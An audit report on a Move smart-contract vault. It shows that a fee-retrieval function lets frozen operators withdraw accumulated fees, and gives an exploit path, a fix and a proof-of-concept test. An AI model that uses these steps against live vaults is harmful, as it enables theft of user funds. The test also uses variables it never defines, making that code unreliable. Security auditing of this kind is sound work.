# Audit Report

## Title
Frozen Operator Bypass via Fee Retrieval Function

## Summary
Frozen operators in the Volo vault system can bypass the operator freeze mechanism by calling `retrieve_deposit_withdraw_fee_operator()` to extract accumulated deposit/withdraw fees, despite being blocked from all other vault operations. This defeats the purpose of the freeze security control.

## Finding Description

The Volo vault implements an operator freeze mechanism where administrators can freeze misbehaving operators. [1](#0-0)  The freeze status is tracked in `Operation.freezed_operators` and enforced via `assert_operator_not_freezed()`. [2](#0-1) 

All operator functions in the `operation` module properly enforce this check. [3](#0-2) [4](#0-3)  Similarly, reward manager operator functions check freeze status. [5](#0-4) 

However, `retrieve_deposit_withdraw_fee_operator()` does NOT check the operator freeze status. [6](#0-5)  This function directly calls the underlying fee retrieval without any freeze validation, allowing frozen operators to extract accumulated deposit/withdraw fees.

The root cause is architectural: the function signature doesn't accept an `Operation` parameter, making it impossible to check freeze status. It only requires an `OperatorCap` and directly delegates to `vault.retrieve_deposit_withdraw_fee(amount)`, which only checks vault status but not operator freeze status. [7](#0-6) 

**Exploit Path:**
1. Admin freezes operator via `set_operator_freezed(op_cap_id, true)` due to security concerns
2. Frozen operator cannot execute deposits, withdrawals, or any vault operations (all abort with `ERR_OPERATOR_FREEZED`)
3. But frozen operator CAN call `retrieve_deposit_withdraw_fee_operator()` with their `OperatorCap`
4. Frozen operator successfully extracts accumulated fees, bypassing the freeze restriction

## Impact Explanation

A frozen operator can extract real vault funds in the form of accumulated deposit/withdraw fees, completely defeating the operator freeze security mechanism. Fee rates are configurable up to 5% (MAX_DEPOSIT_FEE_RATE and MAX_WITHDRAW_FEE_RATE). [8](#0-7)  With substantial vault activity, these fees accumulate to significant amounts in `vault.deposit_withdraw_fee_collected`.

The operator freeze mechanism exists to completely stop a potentially malicious or compromised operator from taking ANY actions on the vault. This bypass allows direct value extraction despite the freeze, undermining this critical security control. If an operator is compromised or exhibiting malicious behavior, the protocol intends to block all their actions immediately - but they can still drain accumulated fees.

## Likelihood Explanation

The likelihood is HIGH because:

1. **Public Access:** The function is public and callable by any address holding an `OperatorCap`

2. **No Additional Checks:** The function performs NO freeze validation beyond accepting an `OperatorCap` reference - it doesn't check freeze status or any operator-specific restriction

3. **Realistic Scenario:** Operators are frozen for legitimate security reasons (detected misbehavior, compromised keys, protocol issues). A frozen operator retains possession of their `OperatorCap` object and can immediately call this function

4. **Confirmed by Code:** The test suite verifies frozen operators cannot execute operations, [9](#0-8)  but there is no test verifying frozen operators cannot retrieve fees, indicating this bypass was not considered during development

5. **No Technical Barriers:** The exploit requires only a single function call with no special setup or timing requirements

## Recommendation

Add the `Operation` parameter to `retrieve_deposit_withdraw_fee_operator()` and enforce the freeze check:

```move
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    cap: &OperatorCap,
    operation: &Operation,  // Add this parameter
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault::assert_operator_not_freezed(operation, cap);  // Add freeze check
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

This aligns the function with all other operator functions in the codebase that properly enforce the freeze check.

## Proof of Concept

```move
#[test]
// Demonstrates that a frozen operator can still retrieve fees despite being frozen
public fun test_frozen_operator_can_retrieve_fees() {
    let mut s = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(s.ctx());

    // Setup vault and create operator
    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
    init_vault::init_create_reward_manager<SUI_TEST_COIN>(&mut s);

    // Setup oracle with prices
    s.next_tx(OWNER);
    {
        let mut oracle_config = s.take_shared<OracleConfig>();
        let sui_asset_type = type_name::get<SUI_TEST_COIN>().into_string();
        vault_oracle::add_switchboard_aggregator(
            &admin_cap,
            &mut oracle_config,
            &clock,
            sui_asset_type,
            9,
            &mock_aggregator_sui,
        );
        vault_oracle::set_current_price(&mut oracle_config, &clock, sui_asset_type, 2 * ORACLE_DECIMALS);
        test_scenario::return_shared(oracle_config);
    };

    // Set fee rate and create deposit to accumulate fees
    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        vault_manage::set_deposit_fee(&admin_cap, &mut vault, 100); // 1% fee
        test_scenario::return_shared(vault);
        s.return_to_sender(admin_cap);
    };

    // User deposits, generating fees
    s.next_tx(OWNER);
    {
        let coin = coin::mint_for_testing<SUI_TEST_COIN>(1_000_000_000, s.ctx());
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let mut reward_manager = s.take_shared<RewardManager<SUI_TEST_COIN>>();
        let (_request_id, receipt, coin) = user_entry::deposit(
            &mut vault,
            &mut reward_manager,
            coin,
            1_000_000_000,
            1_980_000_000,
            option::none(),
            &clock,
            s.ctx(),
        );
        transfer::public_transfer(coin, OWNER);
        transfer::public_transfer(receipt, OWNER);
        test_scenario::return_shared(vault);
        test_scenario::return_shared(reward_manager);
    };

    // Execute deposit to collect fees
    s.next_tx(OWNER);
    {
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let config = s.take_shared<OracleConfig>();
        vault::update_free_principal_value(&mut vault, &config, &clock);
        vault.execute_deposit(&clock, &config, 0, 2_000_000_000);
        test_scenario::return_shared(vault);
        test_scenario::return_shared(config);
    };

    // Verify fees were collected (1% of 1 SUI = 10_000_000)
    s.next_tx(OWNER);
    {
        let vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let deposit_fee = vault.deposit_withdraw_fee_collected();
        assert!(deposit_fee == 10_000_000);
        test_scenario::return_shared(vault);
    };

    // Admin freezes the operator
    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let mut operation = s.take_shared<Operation>();
        let operator_cap = s.take_from_sender<OperatorCap>();
        
        vault_manage::set_operator_freezed(
            &admin_cap,
            &mut operation,
            operator_cap.operator_id(),
            true,
        );
        
        // Verify operator is frozen
        assert!(vault::operator_freezed(&operation, operator_cap.operator_id()));
        
        test_scenario::return_shared(operation);
        s.return_to_sender(admin_cap);
        s.return_to_sender(operator_cap);
    };

    // VULNERABILITY: Frozen operator can still retrieve fees
    s.next_tx(OWNER);
    {
        let operator_cap = s.take_from_sender<OperatorCap>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        
        // This should fail for a frozen operator but it succeeds!
        let fee_retrieved = vault_manage::retrieve_deposit_withdraw_fee_operator(
            &operator_cap,
            &mut vault,
            10_000_000,
        );
        
        // Frozen operator successfully extracted all fees
        assert!(fee_retrieved.value() == 10_000_000);
        
        test_scenario::return_shared(vault);
        s.return_to_sender(operator_cap);
        fee_retrieved.destroy_for_testing();
    };

    // Verify fees were actually extracted
    s.next_tx(OWNER);
    {
        let vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let remaining_fees = vault.deposit_withdraw_fee_collected();
        assert!(remaining_fees == 0); // All fees extracted by frozen operator
        test_scenario::return_shared(vault);
    };

    clock.destroy_for_testing();
    s.end();
}
```

## Notes

This vulnerability represents a critical gap in the operator freeze mechanism. While all operational functions properly enforce the freeze check by requiring an `Operation` parameter, the fee retrieval function was designed with a different signature pattern that makes it impossible to check freeze status. The fix is straightforward but requires updating the function signature to accept the `Operation` object, which may require coordination with any existing off-chain integrations that call this function.

### Citations

**File:** volo-vault/sources/volo_vault.move (L30-33)
```text
const DEPOSIT_FEE_RATE: u64 = 10; // default 10bp (0.1%)
const WITHDRAW_FEE_RATE: u64 = 10; // default 10bp (0.1%)
const MAX_DEPOSIT_FEE_RATE: u64 = 500; // max 500bp (5%)
const MAX_WITHDRAW_FEE_RATE: u64 = 500; // max 500bp (5%)
```

**File:** volo-vault/sources/volo_vault.move (L362-378)
```text
public(package) fun set_operator_freezed(
    operation: &mut Operation,
    op_cap_id: address,
    freezed: bool,
) {
    if (operation.freezed_operators.contains(op_cap_id)) {
        let v = operation.freezed_operators.borrow_mut(op_cap_id);
        *v = freezed;
    } else {
        operation.freezed_operators.add(op_cap_id, freezed);
    };

    emit(OperatorFreezed {
        operator_id: op_cap_id,
        freezed: freezed,
    });
}
```

**File:** volo-vault/sources/volo_vault.move (L380-385)
```text
public(package) fun assert_operator_not_freezed(operation: &Operation, cap: &OperatorCap) {
    let cap_id = cap.operator_id();
    // If the operator has ever been freezed, it will be in the freezed_operator map, check its value
    // If the operator has never been freezed, no error will be emitted
    assert!(!operator_freezed(operation, cap_id), ERR_OPERATOR_FREEZED);
}
```

**File:** volo-vault/sources/volo_vault.move (L1544-1557)
```text
public(package) fun retrieve_deposit_withdraw_fee<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    self.check_version();
    self.assert_normal();

    emit(DepositWithdrawFeeRetrieved {
        vault_id: self.vault_id(),
        amount: amount,
    });

    self.deposit_withdraw_fee_collected.split(amount)
}
```

**File:** volo-vault/sources/operation.move (L105-105)
```text
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/operation.move (L218-218)
```text
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/reward_manager.move (L240-241)
```text
    self.check_version();
    vault::assert_operator_not_freezed(operation, cap);
```

**File:** volo-vault/sources/manage.move (L150-156)
```text
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    _: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

**File:** volo-vault/tests/operation/operation.test.move (L1561-1564)
```text
#[test]
#[expected_failure(abort_code = vault::ERR_OPERATOR_FREEZED, location = vault)]
// [TEST-CASE: Should do op fail if operator is freezed.] @test-case OPERATION-012
public fun test_start_op_fail_op_freezed() {
```
